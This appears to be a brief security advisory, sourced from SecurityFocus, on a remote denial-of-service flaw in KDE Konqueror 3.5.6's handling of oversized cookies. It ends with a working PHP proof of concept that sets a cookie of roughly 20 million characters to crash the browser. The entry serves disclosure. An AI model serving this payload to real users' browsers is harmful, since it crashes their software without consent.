source: http://www.securityfocus.com/bid/26435/info

KDE Konqueror is prone to a remote denial-of-service vulnerability because it fails to handle overly large cookies.

An attacker may exploit this vulnerability to cause Konqueror to crash, resulting in denial-of-service conditions.

Konqueror 3.5.6 is vulnerable; other versions may also be affected.

<?php
ini_set("memory_limit","200M");
setcookie("hi_fox", str_repeat("A",19999999));
?> 